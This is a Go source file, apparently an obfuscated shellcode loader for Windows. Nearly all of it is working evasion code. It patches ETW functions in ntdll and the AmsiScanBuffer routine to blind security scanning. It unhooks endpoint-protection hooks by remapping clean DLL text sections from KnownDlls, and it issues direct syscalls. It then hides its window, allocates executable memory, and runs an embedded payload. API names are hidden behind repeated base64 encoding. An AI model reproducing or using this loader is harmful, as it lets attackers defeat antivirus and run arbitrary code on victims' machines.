
	
	package main

	
	

	import (
		filepe "debug/pe"
		"encoding/base64"
		"encoding/hex"
		
		"yIiHwJAjbYqxeL/yIiHwJAjbYqxeL"
		"strconv"
		"fmt"
		"syscall"
		"unsafe"
		"time"
		


		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"
		"github.com/Binject/debug/pe"
		"github.com/awgh/rawreader"
	)
	


	const (
		vyBjW= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (
		tjSbVY uint16
		JYCJ uint16
		iHhIG int = 5
	)

	
	
	
	
	func cNTxx() string {
		VtpDq, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		JpUwUBa, _, _ :=  VtpDq.GetStringValue("CurrentVersion")
		CpzZ, _, err := VtpDq.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			//XmDk, _, _ := VtpDq.GetIntegerValue("CurrentMinorVersionNumber")
			JpUwUBa = strconv.FormatUint(CpzZ, 10)
		}
		defer VtpDq.Close()
		if JpUwUBa == "10" {
			tjSbVY = 0x18
			JYCJ = 0x50
		} else if JpUwUBa == "6.3" {
			tjSbVY = 0x17
			JYCJ = 0x4f
		} else if JpUwUBa == "6.2" {
			tjSbVY = 0x16
			JYCJ = 0x4e
		} else if JpUwUBa == "6.1" {
			tjSbVY = 0x15
			JYCJ= 0x4d
		}
		return JpUwUBa 

	}

	func gyZXZpDc(QScg string,) string {
		var uJyg []byte
			uJyg, _ = base64.StdEncoding.DecodeString(QScg)
		IhiU := 1
		for i := 1; i < iHhIG; i++ {
			uJyg, _ = base64.StdEncoding.DecodeString(string(uJyg))
			IhiU += i
		}
		return string(uJyg)
	
	}

	

	func LyeGDQuViJOLdKLiBw(show bool) {
		MIYbsfcliSOZinaYv := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(gyZXZpDc("Vmxkd1MxWXdNVWRTV0d4UVYwWmFjVlJYY0hObGJHUnpWMjEwYWxJd2NEQldWelZoWVRKU05rMUVhejA9"))
		AQMLGkOvPqzWc := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc(gyZXZpDc("Vm14U1MySXlVblJWV0doaFUwVktjRmxzV2t0TmJIQkpXWHBzVVZWVU1Eaz0="))
		GTYSYTCjCejhQdbf, _, _ := MIYbsfcliSOZinaYv.Call()
		if GTYSYTCjCejhQdbf == 0 {
			return
		}
		if show {
		var lUGCwGjbYPOYeX uintptr = 9
		AQMLGkOvPqzWc.Call(GTYSYTCjCejhQdbf, lUGCwGjbYPOYeX)
		} else {
		var VylNwNctAifLYidO uintptr = 0
		AQMLGkOvPqzWc.Call(GTYSYTCjCejhQdbf, VylNwNctAifLYidO)
		}
	}



	
	const (
		eSTmsm= 997
	)
	var VmHB error = syscall.Errno(eSTmsm)
	var vAemFsvf = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(gyZXZpDc("Vm0xd1QxTXlUa2hWYTJoWFlrVmFjVmxzVW5OalZtUnpZVVU1YkdKR1NsbFdiVFZUWVZVd2QySjZSVDA9"))


	func TctBl(ysjVLaO uintptr, sAJmvPh uintptr, IInKMQ *byte, ZKpKr uintptr, jJxM *uintptr) (err error) {
		r1, _, e1 := syscall.Syscall6(vAemFsvf.Addr(), 5, uintptr(ysjVLaO), uintptr(sAJmvPh), uintptr(unsafe.Pointer(IInKMQ)), uintptr(ZKpKr), uintptr(unsafe.Pointer(jJxM)), 0)
		if r1 == 0 {
			if e1 != 0 {
				err = lXwuAoo(e1)
			} else {
				err = syscall.EINVAL
			}
		}
		return
	}

	func lXwuAoo(e syscall.Errno) error {
		switch e {
		case 0:
			return nil
		case eSTmsm:
			return VmHB
		}
	
		return e
	}
	

	
	var vjWZMpBc = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(gyZXZpDc("VmxkNGIxVXdNSGhWYmxKUVZrVktiMVpxUm5ka01XUlZVMnRrVGxJd1dsbFVNV2hYVm0xS1YxZHVWbHBXYldoUVZGVmFkMWRXVGxWTlJEQTk="))
	var MffXY = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(gyZXZpDc("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0V1JtUnpXa2QwYWxJd01UWldWekUwWVd4d05rMUVhejA9"))
	var wSkxYXY = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(gyZXZpDc("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0WFZtdDVUVmhPVGxKdVFsZFdNbkJIWVZaSmVsbDZhejA9"))
	var xZRm = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(gyZXZpDc("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0WFZtdDVUVmhPVGxKdVFsTlZSbEYzVUZFOVBRPT0="))

	func cKkgjt() {
		ejKOfz := uintptr(0xffffffffffffffff)
		GTjTo := []uintptr{ vjWZMpBc.Addr(), MffXY.Addr(), wSkxYXY.Addr(), xZRm.Addr()}
		for i, _ := range GTjTo {
			CYEkd, _ := hex.DecodeString("4833C0C3")
			var dnde uintptr
			KBzso := len(CYEkd)
			TctBl(ejKOfz, GTjTo[i], &CYEkd[0], uintptr(uint32(KBzso)), &dnde)
		}
	}

	func BHtZKJsX(ejKOfz windows.Handle) {
		GTjTo := []uintptr{ vjWZMpBc.Addr(), MffXY.Addr(), wSkxYXY.Addr(), xZRm.Addr()}
		for i, _ := range GTjTo {
			CYEkd, _ := hex.DecodeString("4833C0C3")
			var dnde uintptr
			KBzso := len(CYEkd)
			TctBl(uintptr(ejKOfz), GTjTo[i], &CYEkd[0], uintptr(uint32(KBzso)), &dnde)
		}
	}



	
	func pzsP() {
		var hmSahjX uint64
		hmSahjX = 0xffffffffffffffff
		WSIX, _ := windows.LoadLibrary(string([]byte{'a','m','s','i','.','d','l','l'}))
		BuCBN, _ := windows.GetProcAddress(WSIX, string([]byte{'a','m','s','i','S','c','a','n','B','u','f','f','e','r'}))
		PGQWVYme, _ :=  hex.DecodeString("B857000780C3")
		var XlIXv uintptr
		XKHr := len(PGQWVYme)
		TctBl(uintptr(hmSahjX), uintptr(uint(BuCBN)), &PGQWVYme[0], uintptr(uint32(XKHr)), &XlIXv)
	}
	

	var procReadProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("ReadProcessMemory")

	func ufrDefTW() uintptr {
		var funcNtAllocateVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc("NtAllocateVirtualMemory")
		handle := uintptr(0xffffffffffffffff)
		num := 2
		var add uintptr
		AllAddr := funcNtAllocateVirtualMemory.Addr()
		for i := 0; i < 20; i++ {
			rawr, _, _ := ReadProcessMemory(handle, AllAddr+uintptr(i), uintptr(num))
			f := fmt.Sprintf("%0x", rawr)
			if f == "0f05" {
				add = AllAddr + uintptr(i)
				return add
			}
		}
		return add
	}

	func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, nSize uintptr) (lpBuffer []uint8, lpNumberOfBytesRead int, ok bool) {
		var nBytesRead int
		buf := make([]uint8, nSize)
		ret, _, _ := procReadProcessMemory.Call(
			uintptr(hProcess),
			lpBaseAddress,
			uintptr(unsafe.Pointer(&buf[0])),
			nSize,
			uintptr(unsafe.Pointer(&nBytesRead)),
		)
	
		return buf, nBytesRead, ret != 0
	}
	
		

	func main() {
		
		cKkgjt()
		pzsP()
		time.Sleep(2606 * time.Millisecond)
		JpUwUBa := cNTxx()
		
		if JpUwUBa == "10" {
			WEtARKryeRDFsPIVh()
		}
		cKkgjt()
		LyeGDQuViJOLdKLiBw(false)
		IRvFtdexIiYKDavQxb := yIiHwJAjbYqxeL.CrQMsgCVByqRSgqys()
		SLDqHAXwGEyr(IRvFtdexIiYKDavQxb)
	}

	
	func SLDqHAXwGEyr(IRvFtdexIiYKDavQxb []byte){
		ozPqvsSuItlukHoOfu := windows.NewLazySystemDLL("ntdll.dll")
		popwASbNaP := windows.NewLazySystemDLL("kernel32")
		KoaSipeYvOxWqlw := ozPqvsSuItlukHoOfu.NewProc("RtlCopyMemory")
		fsLoQXFCnPQIonI := popwASbNaP.NewProc("VirtualAlloc")

		var eVZequIyHP, ozyuUBHZHTDcYF uintptr
		var RnnMIWNCNLXKtBMVd uintptr
		ZFLsVKmHox := uintptr(0xffffffffffffffff)
		usMzdYYzYcVDdzdtSk := uintptr(len(IRvFtdexIiYKDavQxb))
		ozyuUBHZHTDcYF = 0x40
		eVZequIyHP = 0x3000
		cPOBbtIngtg, _, _ := fsLoQXFCnPQIonI.Call(0, uintptr(len(IRvFtdexIiYKDavQxb)), eVZequIyHP, ozyuUBHZHTDcYF)

		
		KoaSipeYvOxWqlw.Call(cPOBbtIngtg, (uintptr)(unsafe.Pointer(&IRvFtdexIiYKDavQxb[0])), uintptr(len(IRvFtdexIiYKDavQxb)))
		
		


		yIiHwJAjbYqxeL.TYCnQkHqHHqHvkgv(
			JYCJ, 
			ZFLsVKmHox,
			(*uintptr)(unsafe.Pointer(&cPOBbtIngtg)),
			&usMzdYYzYcVDdzdtSk,
			0x20,
			&RnnMIWNCNLXKtBMVd,
			)
		
		syscall.Syscall(cPOBbtIngtg, 0, 0, 0, 0)
	}


	
	
		var ZWOjfzfMWpTxLzeu      uint16
		var mKeaAwWUaxDQz uint16
		var VDOHFtxTfzSqk      uint16
		func WEtARKryeRDFsPIVh()  {
			nJImMSeucyiaPY := []string{string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
			string([]byte{'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'})}
		
	 	for i, _ := range nJImMSeucyiaPY {
			KnownDLL(nJImMSeucyiaPY[i])
			}
		}

		var procNtOpenSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenSection")
		var procNtMapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtMapViewOfSection")
		var procNtUnmapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtUnmapViewOfSection")

		type sstring struct {
			PWstr *uint16
		}
	
		func (s sstring) String() string {
			return windows.UTF16PtrToString(s.PWstr)
		}
	
		func KnownDLL(nUpUYelLRn  string) []byte {
			
			var MBbIprYkjmTAjksFjw , HOMymgICqR , QNfLiLWysdtZCo  uintptr
			YctlJZHFVj := uintptr(0xffffffffffffffff)
			ShJqNhUyQhDzwwLq := "\\" + string([]byte{'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's'}) + "\\" + nUpUYelLRn 
			RelDHTYgOzpT, _ := windows.NewNTUnicodeString(ShJqNhUyQhDzwwLq)
			uCKejyTcvHmVxO := windows.OBJECT_ATTRIBUTES{}
			uCKejyTcvHmVxO.Attributes = 0x00000040
			uCKejyTcvHmVxO.ObjectName = RelDHTYgOzpT
			uCKejyTcvHmVxO.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
			NXklQyjCBDybvnCg := ufrDefTW()
			ZWOjfzfMWpTxLzeu = 0x37
			gxAzwfeIfixoFP := 0x0004
			r, _ := yIiHwJAjbYqxeL.RuYMmRpDCLCwEwOvvpe(
				ZWOjfzfMWpTxLzeu, 
				NXklQyjCBDybvnCg, 
				uintptr(unsafe.Pointer(&MBbIprYkjmTAjksFjw)), 
				uintptr(gxAzwfeIfixoFP), 
				uintptr(unsafe.Pointer(&uCKejyTcvHmVxO)),
			)
			if r != 0 {
			}
			mKeaAwWUaxDQz = 0x28
			zero := 0
			one := 1
			yIiHwJAjbYqxeL.MadZzSmGIXnlzHEJtJe(
				mKeaAwWUaxDQz, 
				NXklQyjCBDybvnCg, 
				MBbIprYkjmTAjksFjw, 
				YctlJZHFVj, 
				uintptr(unsafe.Pointer(&QNfLiLWysdtZCo)), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(unsafe.Pointer(&HOMymgICqR)), 
				uintptr(one), 
				uintptr(zero), 
				uintptr(syscall.PAGE_READONLY),
			)
			jEAPHVETWvffclUSj := rawreader.New(QNfLiLWysdtZCo, int(HOMymgICqR))
			bmTqbxzvKuw, _ := pe.NewFileFromMemory(jEAPHVETWvffclUSj)
			SmLzkgQiiLJi, err := bmTqbxzvKuw.Bytes()
			if err != nil {
			}
			QASFgeBySjAOTxNp := bmTqbxzvKuw.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
			IrtpVLWxJnW := SmLzkgQiiLJi[QASFgeBySjAOTxNp.Offset:QASFgeBySjAOTxNp.Size]
			kycMAhYAjTZm, error := filepe.Open(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  nUpUYelLRn )
			if error != nil {
			}
			qqaeLsROzgAcfFuJg := kycMAhYAjTZm.Section(".text")
			eVxYRPQBnNiKGl, error := windows.LoadDLL(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  nUpUYelLRn )
			if error != nil {
			}
			EDJEZkgGnLWWgNcHMf := eVxYRPQBnNiKGl.Handle
			bitxdusIdOcVT  := uintptr(EDJEZkgGnLWWgNcHMf)
			elXUCtbCCBI := uint(bitxdusIdOcVT) + uint(qqaeLsROzgAcfFuJg.VirtualAddress)
			VDOHFtxTfzSqk = 0x50
			yAqHVyFBHyWU := uintptr(len(IrtpVLWxJnW))
			var FBlxCxQvfdQulXPB uintptr

			UGZzHJfJGNoBhTF, _ := yIiHwJAjbYqxeL.NjeJYdfweripySE(
				VDOHFtxTfzSqk, 
				NXklQyjCBDybvnCg, 
				YctlJZHFVj, 
				(*uintptr)(unsafe.Pointer(&elXUCtbCCBI)), 
				&yAqHVyFBHyWU, 
				0x40, 
				&FBlxCxQvfdQulXPB,
			)
			if UGZzHJfJGNoBhTF != 0 {
			}
			KeTkZHEdINBHzAs(IrtpVLWxJnW, uintptr(elXUCtbCCBI))
			kycMAhYAjTZm.Close()
			UGZzHJfJGNoBhTF, _ = yIiHwJAjbYqxeL.NjeJYdfweripySE(
				VDOHFtxTfzSqk, 
				NXklQyjCBDybvnCg, 
				YctlJZHFVj, 
				(*uintptr)(unsafe.Pointer(&elXUCtbCCBI)), 
				&yAqHVyFBHyWU, 
				0x20, 
				&FBlxCxQvfdQulXPB,
			)
			if UGZzHJfJGNoBhTF != 0 {
			}
			syscall.Syscall(uintptr(procNtUnmapViewOfSection.Addr()), 2, uintptr(YctlJZHFVj), QNfLiLWysdtZCo, 0)
			return IrtpVLWxJnW
		}


		func KeTkZHEdINBHzAs(kmaprpxgCnaEPZ []byte, hLXiJCjsmCQlFpF uintptr) {
			for lCLllHNjFuINSKyj := uint32(0); lCLllHNjFuINSKyj < uint32(len(kmaprpxgCnaEPZ)); lCLllHNjFuINSKyj++ {
				wUjxKrGrMQW := unsafe.Pointer(hLXiJCjsmCQlFpF + uintptr(lCLllHNjFuINSKyj))
				tkiYQrDRywCICXWY := (*byte)(wUjxKrGrMQW)
				*tkiYQrDRywCICXWY = kmaprpxgCnaEPZ[lCLllHNjFuINSKyj]
			}
		}

	
